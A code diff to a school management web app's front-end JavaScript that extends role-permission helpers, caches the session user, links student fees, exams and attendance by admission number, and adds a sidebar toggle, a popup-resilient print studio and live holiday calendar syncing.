@@ -284,7 +284,13 @@ try {
 } catch (e) {
   window.currentModule = currentModule;
 }
-let currentUser = null; // ← global session user for role checks
+let currentUser = null; // global session user for role checks
+try {
+  const cachedUserStr = localStorage.getItem("tps_user") || sessionStorage.getItem("tps_user");
+  if (cachedUserStr) {
+    currentUser = JSON.parse(cachedUserStr);
+  }
+} catch (_) {}
 
 // Auto-shorten long fee term descriptions
 window.formatTermString = function(val) {
@@ -306,25 +312,44 @@ window.formatTermString = function(val) {
   return val;
 };
 // ─── ROLE PERMISSION HELPERS ───────────────────────────────────────
-const ROLE_LEVEL = { administrator: 4, principal: 3, staff: 3, teacher: 2, student: 1 };
-function getRoleLevel(role) { return ROLE_LEVEL[String(role || "").toLowerCase()] || 0; }
-function userIsAdmin() { return String(currentUser?.role || "").toLowerCase() === "administrator"; }
+const ROLE_LEVEL = {
+  super_admin: 5,
+  superadmin: 5,
+  administrator: 4,
+  school_admin: 4,
+  schooladmin: 4,
+  admin: 4,
+  principal: 3,
+  accountant: 3,
+  staff: 3,
+  teacher: 2,
+  student: 1,
+  parent: 1
+};
+function getRoleLevel(role) {
+  const r = String(role || "").toLowerCase().trim().replace(/[\s-]+/g, "_");
+  return ROLE_LEVEL[r] || 0;
+}
+function userIsAdmin() {
+  const r = String(currentUser?.role || "").toLowerCase().trim().replace(/[\s-]+/g, "_");
+  return r === "administrator" || r === "school_admin" || r === "schooladmin" || r === "admin" || r === "super_admin" || r === "superadmin";
+}
 function userIsStaffOrAbove() { return getRoleLevel(currentUser?.role) >= 3 || userIsAdmin(); }
-function userIsTeacherOrAbove() { return getRoleLevel(currentUser?.role) >= 2; }
-function userIsStudent() { return String(currentUser?.role || "").toLowerCase() === "student"; }
+function userIsTeacherOrAbove() { return getRoleLevel(currentUser?.role) >= 2 || userIsStaffOrAbove(); }
+function userIsStudent() {
+  const r = String(currentUser?.role || "").toLowerCase().trim();
+  return r === "student" || r === "parent";
+}
 
 function getLinkedStudent() {
   if (!userIsStudent()) return null;
   const store = getStore();
   const adNo = String(currentUser?.admissionNo || "").trim().toLowerCase();
-  const fName = String(currentUser?.fullName || "").trim().toLowerCase();
+  if (!adNo) return null;
   
   return (store.students || []).find(s => {
     const sAd = String(s.admissionNo || "").trim().toLowerCase();
-    const sName = String(s.fullName || "").trim().toLowerCase();
-    if (sAd && adNo && sAd === adNo) return true;
-    if (sName && fName && sName === fName) return true;
-    return false;
+    return Boolean(sAd && sAd === adNo);
   }) || null;
 }
 
@@ -618,6 +643,9 @@ let appliedFeeIds = [];
 
 const refs = {
   sidebar: document.getElementById("sidebar"),
+  sidebarToggleBtn: document.getElementById("sidebarToggleBtn"),
+  topbarSidebarToggleBtn: document.getElementById("topbarSidebarToggleBtn"),
+  liveOtaStreamBtn: document.getElementById("liveOtaStreamBtn"),
   mobileMenuBtn: document.getElementById("mobileMenuBtn"),
   mobileSidebarBackdrop: document.getElementById("mobileSidebarBackdrop"),
   authOverlay: document.getElementById("authOverlay"),
@@ -734,6 +762,57 @@ function setMobileSidebarOpen(open) {
   if (refs.mobileMenuBtn) {
     refs.mobileMenuBtn.setAttribute("aria-expanded", open ? "true" : "false");
   }
+}
+
+function toggleSidebarCollapse() {
+  if (isMobileLayout()) {
+    const opening = !refs.sidebar?.classList.contains("mobile-open");
+    setMobileSidebarOpen(opening);
+    return;
+  }
+  const appEl = document.querySelector(".app");
+  const isCurrentlyCollapsed = refs.sidebar?.classList.contains("collapsed") || false;
+  const willCollapse = !isCurrentlyCollapsed;
+
+  refs.sidebar?.classList.toggle("collapsed", willCollapse);
+  appEl?.classList.toggle("sidebar-collapsed", willCollapse);
+
+  const sidebarToggleBtn = document.getElementById("sidebarToggleBtn");
+  const topbarSidebarToggleBtn = document.getElementById("topbarSidebarToggleBtn");
+  const tip = willCollapse ? "Expand sidebar (Ctrl+B)" : "Collapse sidebar (Ctrl+B)";
+  if (sidebarToggleBtn) {
+    sidebarToggleBtn.title = tip;
+    sidebarToggleBtn.setAttribute("aria-label", tip);
+  }
+  if (topbarSidebarToggleBtn) {
+    topbarSidebarToggleBtn.title = tip;
+    topbarSidebarToggleBtn.setAttribute("aria-label", tip);
+  }
+
+  try {
+    localStorage.setItem("tps_sidebar_collapsed", willCollapse ? "true" : "false");
+  } catch (e) {}
+}
+
+function initSidebarCollapseState() {
+  try {
+    const saved = localStorage.getItem("tps_sidebar_collapsed");
+    if (saved === "true" && !isMobileLayout()) {
+      const appEl = document.querySelector(".app");
+      refs.sidebar?.classList.add("collapsed");
+      appEl?.classList.add("sidebar-collapsed");
+      const sidebarToggleBtn = document.getElementById("sidebarToggleBtn");
+      const topbarSidebarToggleBtn = document.getElementById("topbarSidebarToggleBtn");
+      if (sidebarToggleBtn) {
+        sidebarToggleBtn.title = "Expand sidebar (Ctrl+B)";
+        sidebarToggleBtn.setAttribute("aria-label", "Expand sidebar (Ctrl+B)");
+      }
+      if (topbarSidebarToggleBtn) {
+        topbarSidebarToggleBtn.title = "Expand sidebar (Ctrl+B)";
+        topbarSidebarToggleBtn.setAttribute("aria-label", "Expand sidebar (Ctrl+B)");
+      }
+    }
+  } catch (e) {}
 }
 
 function todayStr() {
@@ -1101,7 +1180,15 @@ function cleanupOrphanedFaces() {
 }
 
 function applyAuthUI(session) {
-  if (!session) localStorage.removeItem("token");
+  if (!session) {
+    localStorage.removeItem("token");
+    localStorage.removeItem("tps_user");
+    sessionStorage.removeItem("tps_user");
+  } else {
+    try {
+      localStorage.setItem("tps_user", JSON.stringify(session));
+    } catch (_) {}
+  }
   const loggedIn = !!session;
   currentUser = session || null;
   const preloader = document.getElementById("preloaderStyle");
@@ -1139,10 +1226,16 @@ function applyAuthUI(session) {
   if (loggedIn) {
     if (activeName) activeName.textContent = session.fullName || session.username;
     if (activeRole) activeRole.textContent = session.role;
-    const role = String(session.role || "").toLowerCase();
+    const role = String(session.role || "").toLowerCase().trim().replace(/[\s-]+/g, "_");
     const roleColors = {
+      super_admin: "#ef4444",
+      superadmin: "#ef4444",
       administrator: "#ef4444",
+      school_admin: "#ef4444",
+      schooladmin: "#ef4444",
+      admin: "#ef4444",
       principal: "#8b5cf6",
+      accountant: "#2563eb",
       staff: "#2563eb",
       teacher: "#10b981",
       student: "#f59e0b"
@@ -1187,6 +1280,8 @@ async function signup(payload) {
 
 async function logout() {
   localStorage.removeItem("token");
+  localStorage.removeItem("tps_user");
+  sessionStorage.removeItem("tps_user");
   await api("/api/auth/logout", { method: "POST" });
 }
 
@@ -1199,23 +1294,55 @@ function setAuthMode(mode) {
   refs.authSubtitle.textContent = isLogin ? "Sign in to continue" : "Create account to continue";
 }
 
+function getSaasEnabledModulesSet() {
+  try {
+    const store = typeof getStore === "function" ? getStore() : serverStore;
+    const settingsList = Array.isArray(store?.settings) ? store.settings : [];
+    const row = settingsList.find(s => (s.key || s.KEY) === "saas_enabled_modules");
+    if (!row || !row.value) return null;
+    const parsed = typeof row.value === "string" ? JSON.parse(row.value) : row.value;
+    if (!Array.isArray(parsed) || parsed.length === 0) return null;
+    return new Set(parsed);
+  } catch (e) {
+    return null;
+  }
+}
+
+window.isSaasModuleEnabled = function(modKey) {
+  const set = getSaasEnabledModulesSet();
+  if (!set) return true;
+  return set.has(modKey);
+};
+
 function getVisibleModules() {
-  if (!currentUser) return ["dashboard"];
+  if (!currentUser) {
+    if (localStorage.getItem("token")) return [...moduleOrder];
+    return ["dashboard"];
+  }
   let mods = ["dashboard"];
-  if (userIsAdmin()) mods = moduleOrder;
+  if (userIsAdmin()) mods = [...moduleOrder];
   else if (userIsStaffOrAbove()) mods = moduleOrder.filter(m => !ADMIN_ONLY_MODULES.has(m));
   else if (String(currentUser.role || "").toLowerCase() === "teacher") mods = moduleOrder.filter(m => TEACHER_VISIBLE_MODULES.has(m));
   else if (userIsStudent()) mods = moduleOrder.filter(m => STUDENT_VISIBLE_MODULES.has(m));
+  else mods = [...moduleOrder];
   
   if (!userIsStudent()) {
     mods = mods.filter(m => m !== "myProfile");
   }
   
-  // Ensure admissions is visible for all roles except Student
+  // Ensure admissions & appLiveUsers are visible for non-students unless disabled by Super Admin
   if (!userIsStudent()) { if (!mods.includes("appLiveUsers")) mods.push("appLiveUsers"); }
   if (moduleConfig.admissions && !userIsStudent()) {
     if (!mods.includes("admissions")) mods.push("admissions");
   }
+
+  // Enforce Super Admin module entitlements from Turso DB settings (`saas_enabled_modules`)
+  const saasSet = getSaasEnabledModulesSet();
+  if (saasSet && !userIsAdmin()) {
+    mods = mods.filter(m => saasSet.has(m));
+    if (mods.length === 0) mods = ["dashboard"];
+  }
+
   return mods;
 }
 
@@ -1230,7 +1357,8 @@ function canCurrentUserWrite(moduleName) {
 
 function canCurrentUserDelete() {
   if (!currentUser) return false;
-  const role = String(currentUser.role || "").toLowerCase();
+  if (userIsAdmin()) return true;
+  const role = String(currentUser.role || "").toLowerCase().trim();
   return role === "administrator" || role === "principal";
 }
 
@@ -2389,7 +2517,7 @@ function getCurrentList() {
     const s = getLinkedStudent();
     if (s) {
       if (currentModule === "students") {
-        list = list.filter(x => String(x.id) === String(s.id));
+        list = list.filter(x => String(x.admissionNo || "").trim().toLowerCase() === String(s.admissionNo || "").trim().toLowerCase());
       } else if (currentModule === "holidays") {
         // Show all holidays
         list = list;
@@ -2397,11 +2525,11 @@ function getCurrentList() {
         // Show only class-specific subjects/timetable
         list = list.filter(x => String(x.className) === String(s.className));
       } else {
-        list = list.filter(x => 
-          (x.admissionNo && String(x.admissionNo) === String(s.admissionNo)) || 
-          (x.studentName && String(x.studentName) === String(s.fullName)) ||
-          (x.rollNo && String(x.rollNo) === String(s.rollNo))
-        );
+        const sAdm = String(s.admissionNo || "").trim().toLowerCase();
+        list = list.filter(x => {
+          const xAdm = String(x.admissionNo || x.registrationNo || x.targetAdmissionNo || "").trim().toLowerCase();
+          return Boolean(sAdm && xAdm === sAdm);
+        });
       }
     } else {
       list = []; // No linked student = No data
@@ -3105,7 +3233,11 @@ function closeStudentProfile() {
 
 function openStudentProfileById(studentId) {
   const store = getStore();
-  const student = (store.students || []).find((s) => Number(s.id) === Number(studentId));
+  const targetKey = String(studentId || "").trim().toLowerCase();
+  const student = (store.students || []).find((s) =>
+    String(s.admissionNo || "").trim().toLowerCase() === targetKey ||
+    Number(s.id) === Number(studentId)
+  );
   if (!student) return window.alert("Student not found.");
   studentProfileStudent = student;
   activeStudentProfileTab = "profile";
@@ -3350,7 +3482,11 @@ function renderStudentProfile() {
 
   if (activeStudentProfileTab === "exams") {
     const store = getStore();
-    const exams = (store.exams || []).filter((e) => e.studentName === student.fullName);
+    const targetAdm = String(student.admissionNo || "").trim().toLowerCase();
+    const exams = (store.exams || []).filter((e) => {
+      const eAdm = String(e.admissionNo || e.registrationNo || "").trim().toLowerCase();
+      return Boolean(targetAdm && eAdm === targetAdm);
+    });
     const byExam = {};
     let grandObtained = 0;
     let grandMax = 0;
@@ -3546,8 +3682,9 @@ function renderStudentProfile() {
 
     if (activeStudentProfileTab === "fees") {
     const store = getStore();
-    const fees = (store.fees || []).filter((f) => f.studentName === student.fullName);
-    let dues = (store.dueManagement || []).filter((d) => d.studentName === student.fullName);
+    const targetAdm = String(student.admissionNo || "").trim().toLowerCase();
+    const fees = (store.fees || []).filter((f) => Boolean(targetAdm && String(f.admissionNo || "").trim().toLowerCase() === targetAdm));
+    let dues = (store.dueManagement || []).filter((d) => Boolean(targetAdm && String(d.admissionNo || "").trim().toLowerCase() === targetAdm));
 
     // Auto-filter out duplicate dues that are already covered by fee records
     dues = dues.filter(d => {
@@ -3765,7 +3902,8 @@ function renderStudentProfile() {
   if (activeStudentProfileTab === "feeCard") {
     const store = getStore();
     const academicOrder = ["Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "Jan", "Feb", "Mar"];
-    const fees = (store.fees || []).filter((f) => String(f.admissionNo || f.studentName) === String(student.admissionNo || student.fullName));
+    const targetAdm = String(student.admissionNo || "").trim().toLowerCase();
+    const fees = (store.fees || []).filter((f) => Boolean(targetAdm && String(f.admissionNo || "").trim().toLowerCase() === targetAdm));
     
     const rows = academicOrder.map(m => {
        // Filter records where the month string contains this specific month name
@@ -3828,7 +3966,8 @@ function renderStudentProfile() {
 
   if (activeStudentProfileTab === "attendance") {
     const store = getStore();
-    const attendance = (store.attendance || []).filter((a) => a.studentName === student.fullName && a.className === student.className);
+    const targetAdm = String(student.admissionNo || "").trim().toLowerCase();
+    const attendance = (store.attendance || []).filter((a) => Boolean(targetAdm && String(a.admissionNo || "").trim().toLowerCase() === targetAdm));
     const uniqueDates = Array.from(new Set(attendance.map((a) => String(a.date)).filter(Boolean)));
     const totalDays = uniqueDates.length;
     const presentDays = attendance.filter((a) => {
@@ -4024,14 +4163,183 @@ function startGenericEditById(moduleName, recordId) {
   first?.focus?.();
 }
 
+// ═══════════════════════════════════════════════════════════════════════
+// UNIVERSAL POPUP-BLOCKED RESILIENT PRINT ENGINE
+// ═══════════════════════════════════════════════════════════════════════
+function openInPagePrintStudioModal(html, title) {
+  let modal = document.getElementById("tpsPrintStudioModal");
+  if (!modal) {
+    modal = document.createElement("div");
+    modal.id = "tpsPrintStudioModal";
+    modal.style.cssText = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(15,23,42,0.85);backdrop-filter:blur(8px);z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:12px;box-sizing:border-box;";
+    modal.innerHTML = `
+      <div style="background:#ffffff;border-radius:16px;width:100%;max-width:1250px;height:95vh;display:flex;flex-direction:column;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);overflow:hidden;border:1px solid #cbd5e1;">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:12px 20px;background:#0f172a;color:#ffffff;border-bottom:1px solid #334155;">
+          <div style="display:flex;align-items:center;gap:10px;">
+            <span style="font-size:1.4rem;">🖨️</span>
+            <div>
+              <div id="tpsPrintStudioTitle" style="font-weight:800;font-size:1.05rem;color:#f8fafc;">Print Studio</div>
+              <div style="font-size:0.72rem;color:#94a3b8;">Interactive Print Studio &amp; Document Viewer</div>
+            </div>
+          </div>
+          <div style="display:flex;align-items:center;gap:10px;">
+            <button id="tpsPrintStudioDirectPrintBtn" type="button" style="background:#2563eb;color:#ffffff;border:none;padding:8px 18px;border-radius:8px;font-weight:700;font-size:0.85rem;cursor:pointer;display:flex;align-items:center;gap:6px;box-shadow:0 2px 6px rgba(37,99,235,0.3);">
+              <span>🖨️ Print Now</span>
+            </button>
+            <button id="tpsPrintStudioNewTabBtn" type="button" style="background:#334155;color:#e2e8f0;border:1px solid #475569;padding:8px 14px;border-radius:8px;font-weight:600;font-size:0.82rem;cursor:pointer;display:flex;align-items:center;gap:6px;">
+              <span>↗ Open in Tab</span>
+            </button>
+            <button id="tpsPrintStudioCloseBtn" type="button" style="background:rgba(255,255,255,0.1);color:#ffffff;border:none;width:32px;height:32px;border-radius:50%;font-size:1.2rem;cursor:pointer;display:grid;place-items:center;">
+              ✕
+            </button>
+          </div>
+        </div>
+        <div style="flex:1;position:relative;background:#f8fafc;">
+          <iframe id="tpsPrintStudioIframe" style="width:100%;height:100%;border:none;background:#ffffff;"></iframe>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(modal);
+
+    const closeBtn = document.getElementById("tpsPrintStudioCloseBtn");
+    if (closeBtn) closeBtn.onclick = () => { modal.style.display = "none"; };
+    modal.onclick = (e) => {
+      if (e.target === modal) modal.style.display = "none";
+    };
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape" && modal.style.display !== "none") {
+        modal.style.display = "none";
+      }
+    });
+
+    const printBtn = document.getElementById("tpsPrintStudioDirectPrintBtn");
+    if (printBtn) {
+      printBtn.onclick = () => {
+        const ifr = document.getElementById("tpsPrintStudioIframe");
+        if (ifr && ifr.contentWindow) {
+          ifr.contentWindow.focus();
+          ifr.contentWindow.print();
+        }
+      };
+    }
+
+    const newTabBtn = document.getElementById("tpsPrintStudioNewTabBtn");
+    if (newTabBtn) {
+      newTabBtn.onclick = () => {
+        if (window._currentPrintStudioHtml) {
+          const blob = new Blob([window._currentPrintStudioHtml], { type: "text/html;charset=utf-8" });
+          const blobUrl = URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = blobUrl;
+          a.target = "_blank";
+          a.rel = "noopener noreferrer";
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(blobUrl);
+          }, 3000);
+        }
+      };
+    }
+  }
+
+  window._currentPrintStudioHtml = html;
+  const titleEl = document.getElementById("tpsPrintStudioTitle");
+  if (titleEl) titleEl.textContent = title || "Print Studio";
+
+  modal.style.display = "flex";
+
+  const iframe = document.getElementById("tpsPrintStudioIframe");
+  if (iframe) {
+    const doc = iframe.contentWindow.document;
+    doc.open();
+    doc.write(html);
+    doc.close();
+  }
+}
+
+function openPrintWindowOrFallback(html, title = "Print Document", options = {}) {
+  const { autoPrint = false, isInteractiveStudio = false } = options;
+
+  let w = null;
+  try {
+    w = window.open("", "_blank");
+  } catch (_) {
+    w = null;
+  }
+
+  if (w && !w.closed) {
+    try {
+      w.document.open();
+      w.document.write(html);
+      w.document.close();
+      w.focus();
+      return;
+    } catch (writeErr) {
+      console.warn("Writing to popup failed, falling back to in-page printer:", writeErr);
+    }
+  }
+
+  // If window.open was blocked by browser:
+  if (isInteractiveStudio) {
+    openInPagePrintStudioModal(html, title);
+    if (typeof showToast === "function") {
+      showToast("📄 Opened Print Studio in preview modal", "info");
+    }
+    return;
+  }
+
+  // For non-interactive direct printable documents (Receipts, Slips, Reports):
+  try {
+    let iframe = document.getElementById("__tps_print_iframe__");
+    if (!iframe) {
+      iframe = document.createElement("iframe");
+      iframe.id = "__tps_print_iframe__";
+      iframe.style.position = "fixed";
+      iframe.style.right = "0";
+      iframe.style.bottom = "0";
+      iframe.style.width = "0";
+      iframe.style.height = "0";
+      iframe.style.border = "none";
+      iframe.style.visibility = "hidden";
+      iframe.style.zIndex = "-9999";
+      document.body.appendChild(iframe);
+    }
+
+    const doc = iframe.contentWindow.document;
+    doc.open();
+    doc.write(html);
+    doc.close();
+
+    if (typeof showToast === "function") {
+      showToast("🖨️ Opening print dialog…", "info");
+    }
+
+    setTimeout(() => {
+      try {
+        iframe.contentWindow.focus();
+        iframe.contentWindow.print();
+      } catch (printErr) {
+        openInPagePrintStudioModal(html, title);
+      }
+    }, 450);
+  } catch (err) {
+    openInPagePrintStudioModal(html, title);
+  }
+}
+window.openPrintWindowOrFallback = openPrintWindowOrFallback;
+window.openInPagePrintStudioModal = openInPagePrintStudioModal;
+
 function printStudentReport(student) {
   if (!student) return;
   const store = getStore();
   const split = splitClassName(student.className);
+  const targetAdm = String(student.admissionNo || "").trim().toLowerCase();
 
-  const exams = (store.exams || []).filter((e) => e.studentName === student.fullName);
-  const fees = (store.fees || []).filter((f) => f.studentName === student.fullName);
-  const attendance = (store.attendance || []).filter((a) => a.studentName === student.fullName && a.className === student.className);
+  const exams = (store.exams || []).filter((e) => Boolean(targetAdm && String(e.admissionNo || e.registrationNo || "").trim().toLowerCase() === targetAdm));
+  const fees = (store.fees || []).filter((f) => Boolean(targetAdm && String(f.admissionNo || "").trim().toLowerCase() === targetAdm));
+  const attendance = (store.attendance || []).filter((a) => Boolean(targetAdm && String(a.admissionNo || "").trim().toLowerCase() === targetAdm));
 
     let grandObtained = 0;
   let grandMax = 0;
@@ -4176,11 +4484,7 @@ function printStudentReport(student) {
   `;
 
   const html = buildPrintableHtml("Student Report", contentHtml);
-  const w = window.open("", "_blank");
-  if (!w) return window.alert("Popup blocked. Allow popups to print.");
-  w.document.open();
-  w.document.write(html);
-  w.document.close();
+  openPrintWindowOrFallback(html, "Student Report", { autoPrint: true });
 }
 
 function getNextId(items) {
@@ -4293,12 +4597,13 @@ function getDashboardStats(store) {
   if (userIsStudent()) {
     const s = getLinkedStudent();
     if (!s) return { "Status": "No Linked Record" };
+    const targetAdm = String(s.admissionNo || "").trim().toLowerCase();
     
-    const myFees = fees.filter(f => String(f.admissionNo) === String(s.admissionNo) || String(f.studentName) === String(s.fullName));
+    const myFees = fees.filter(f => Boolean(targetAdm && String(f.admissionNo || "").trim().toLowerCase() === targetAdm));
     const totalPaid = myFees.reduce((acc, val) => acc + asNum(val.paidAmount), 0);
     const totalBalance = myFees.reduce((acc, val) => acc + asNum(val.balance), 0);
     
-    const myAtt = (store.attendance || []).filter(a => String(a.studentName) === String(s.fullName) || String(a.rollNo) === String(s.rollNo));
+    const myAtt = (store.attendance || []).filter(a => Boolean(targetAdm && String(a.admissionNo || "").trim().toLowerCase() === targetAdm));
     const presentDays = myAtt.filter(a => String(a.status).toLowerCase() === "present").length;
     const absentDays = myAtt.filter(a => String(a.status).toLowerCase() === "absent").length;
 
@@ -4356,11 +4661,72 @@ function getDashboardStats(store) {
 }
 
 window.dashboardCalDate = new Date();
+window._liveHolidaysSyncedYears = new Set();
+window._liveHolidaysFetching = false;
 
-window.renderDashboardCalendarHTML = function() {
+window.fetchLiveHolidays = async function(year, forceSync = false) {
+    if (window._liveHolidaysFetching && !forceSync) return;
+    window._liveHolidaysFetching = true;
+    const syncBtn = document.getElementById("dashboardCalLiveSyncBtn");
+    if (syncBtn) {
+        syncBtn.innerHTML = "⏳ Syncing...";
+        syncBtn.style.opacity = "0.7";
+    }
+    try {
+        const targetYear = year || (window.dashboardCalDate ? window.dashboardCalDate.getFullYear() : new Date().getFullYear());
+        const res = await fetch(`/api/holidays/live?year=${encodeURIComponent(targetYear)}${forceSync ? '&sync=1' : ''}`, {
+            headers: { "Cache-Control": "no-cache" }
+        });
+        if (res.ok) {
+            const data = await res.json();
+            if (data && Array.isArray(data.holidays) && data.holidays.length > 0) {
+                window._liveHolidaysSyncedYears.add(String(targetYear));
+                const storeObj = window.getStore ? window.getStore() : null;
+                if (storeObj) {
+                    storeObj.holidays = data.holidays;
+                }
+                const calContainer = document.getElementById("dashboardCalendarContainer");
+                if (calContainer) {
+                    calContainer.outerHTML = window.renderDashboardCalendarHTML(true);
+                }
+                if (typeof renderCalendar === "function" && document.getElementById("schoolCalendar")) {
+                    renderCalendar(true);
+                }
+                if (typeof currentModule !== "undefined" && currentModule === "holidays" && typeof renderTable === "function") {
+                    renderTable();
+                }
+                if (typeof activeStudentProfileTab !== "undefined" && activeStudentProfileTab === "holidays" && typeof renderStudentPortalHolidays === "function") {
+                    renderStudentPortalHolidays();
+                }
+            }
+        }
+    } catch (err) {
+        console.warn("[Live Holidays] Fetch error:", err);
+    } finally {
+        window._liveHolidaysFetching = false;
+        const btnAfter = document.getElementById("dashboardCalLiveSyncBtn");
+        if (btnAfter) {
+            btnAfter.innerHTML = "● Live";
+            btnAfter.style.opacity = "1";
+        }
+    }
+};
+
+window.ensureLiveHolidaysLoaded = function(year) {
+    const yr = String(year || new Date().getFullYear());
+    if (!window._liveHolidaysSyncedYears.has(yr) && !window._liveHolidaysFetching) {
+        window.fetchLiveHolidays(yr, false);
+    }
+};
+
+window.renderDashboardCalendarHTML = function(skipAutoFetch = false) {
     const d = window.dashboardCalDate;
     const year = d.getFullYear();
     const month = d.getMonth();
+    
+    if (!skipAutoFetch) {
+        setTimeout(() => window.ensureLiveHolidaysLoaded(year), 10);
+    }
     
     const firstDay = new Date(year, month, 1).getDay();
     const daysInMonth = new Date(year, month + 1, 0).getDate();
@@ -4369,40 +4735,43 @@ window.renderDashboardCalendarHTML = function() {
     const holidaysList = (window.getStore ? window.getStore().holidays : []) || [];
     
     let html = `
-    <div class="chart-card" id="dashboardCalendarContainer" style="display: flex; flex-direction: column; padding: 20px;">
+    <div class="chart-card" id="dashboardCalendarContainer" style="display: flex; flex-direction: column; padding: 20px; overflow: hidden; box-sizing: border-box;">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
             <h3 class="chart-title" style="margin: 0; font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
                <lord-icon src="https://cdn.lordicon.com/wxnxiano.json" trigger="loop-on-hover" style="width:24px;height:24px"></lord-icon>
                ${monthNames[month]} ${year}
             </h3>
-            <div style="display: flex; gap: 6px;">
+            <div style="display: flex; gap: 6px; align-items: center;">
+                <button id="dashboardCalLiveSyncBtn" onclick="window.fetchLiveHolidays(${year}, true)" title="Live synced with official Indian Holidays calendar (Click to refresh)" style="padding: 4px 8px; border-radius: 8px; border: 1px solid #bbf7d0; background: #f0fdf4; cursor: pointer; color: #15803d; font-size: 0.7rem; font-weight: 700; transition: all 0.2s;">● Live</button>
                 <button onclick="window.changeDashboardCalendarMonth(-1)" style="padding: 4px 10px; border-radius: 8px; border: 1px solid #e2e8f0; background: #f8fafc; cursor: pointer; color: #64748b; font-weight: bold; transition: all 0.2s;" onmouseover="this.style.background='#e2e8f0'" onmouseout="this.style.background='#f8fafc'">◀</button>
                 <button onclick="window.changeDashboardCalendarMonth(1)" style="padding: 4px 10px; border-radius: 8px; border: 1px solid #e2e8f0; background: #f8fafc; cursor: pointer; color: #64748b; font-weight: bold; transition: all 0.2s;" onmouseover="this.style.background='#e2e8f0'" onmouseout="this.style.background='#f8fafc'">▶</button>
             </div>
         </div>
         
-        <div style="display: grid; grid-template-columns: repeat(7, 1fr); gap: 4px; text-align: center; margin-bottom: 8px;">
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Sun</div>
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Mon</div>
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Tue</div>
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Wed</div>
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Thu</div>
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Fri</div>
-            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase;">Sat</div>
+        <div style="display: grid; grid-template-columns: repeat(7, minmax(0, 1fr)); gap: 6px; width: 100%; box-sizing: border-box; text-align: center; margin-bottom: 8px;">
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Sun</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Mon</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Tue</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Wed</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Thu</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Fri</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: #94a3b8; text-transform: uppercase; min-width: 0;">Sat</div>
         </div>
         
-        <div style="display: grid; grid-template-columns: repeat(7, 1fr); gap: 6px; flex-grow: 1;">
+        <div style="display: grid; grid-template-columns: repeat(7, minmax(0, 1fr)); gap: 6px; width: 100%; box-sizing: border-box; flex-grow: 1;">
     `;
     
     for (let i = 0; i < firstDay; i++) {
-        html += `<div style="padding: 5px; border-radius: 8px; background: transparent;"></div>`;
+        html += `<div style="padding: 5px; border-radius: 8px; background: transparent; min-width: 0;"></div>`;
     }
     
     const today = new Date();
     
     for (let day = 1; day <= daysInMonth; day++) {
         const dateStr = `${year}-${String(month+1).padStart(2,'0')}-${String(day).padStart(2,'0')}`;
-        const holiday = holidaysList.find(h => h.date === dateStr);
+        const dayHolidays = holidaysList.filter(h => h.date === dateStr);
+        const holiday = dayHolidays.length > 0 ? dayHolidays[0] : null;
+        const holidayTitle = dayHolidays.map(h => h.name).join(" • ");
         
         let isToday = (day === today.getDate() && month === today.getMonth() && year === today.getFullYear());
         
@@ -4419,10 +4788,10 @@ window.renderDashboardCalendarHTML = function() {
         
         let holidayTag = '';
         if (holiday) {
-            holidayTag = `<div style="font-size: 0.55rem; color: #ef4444; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 2px; width: 100%; text-align: center;">${holiday.name}</div>`;
+            holidayTag = `<div style="font-size: 0.52rem; line-height: 1.15; color: #ef4444; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 3px; width: 100%; max-width: 100%; padding: 0 2px; box-sizing: border-box; text-align: center;">${holidayTitle}</div>`;
         }
         
-        html += `<div style="padding: 6px 2px; border-radius: 8px; background: ${bg}; border: ${border}; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 48px; cursor: default; transition: transform 0.2s;" title="${holiday ? holiday.name : ''}" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='none'">
+        html += `<div style="padding: 6px 2px; border-radius: 8px; background: ${bg}; border: ${border}; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 48px; min-width: 0; width: 100%; box-sizing: border-box; overflow: hidden; cursor: default; transition: transform 0.2s;" title="${holiday ? holidayTitle : ''}" onmouseover="this.style.transform='scale(1.04)'" onmouseout="this.style.transform='none'">
             <div style="color: ${color}; font-weight: ${fontWeight}; font-size: 0.9rem; line-height: 1;">${day}</div>
             ${holidayTag}
         </div>`;
@@ -4727,13 +5096,13 @@ function renderStatsCards(forceFullRebuild = false) {
          <canvas id="feeChart"></canvas>
       </div>
     </div>
-    <div class="chart-card">
+    <div class="chart-card" style="display: flex; flex-direction: column;">
       <h3 class="chart-title">Students Per Class <span class="chart-badge"><div class="dot"></div> Live</span></h3>
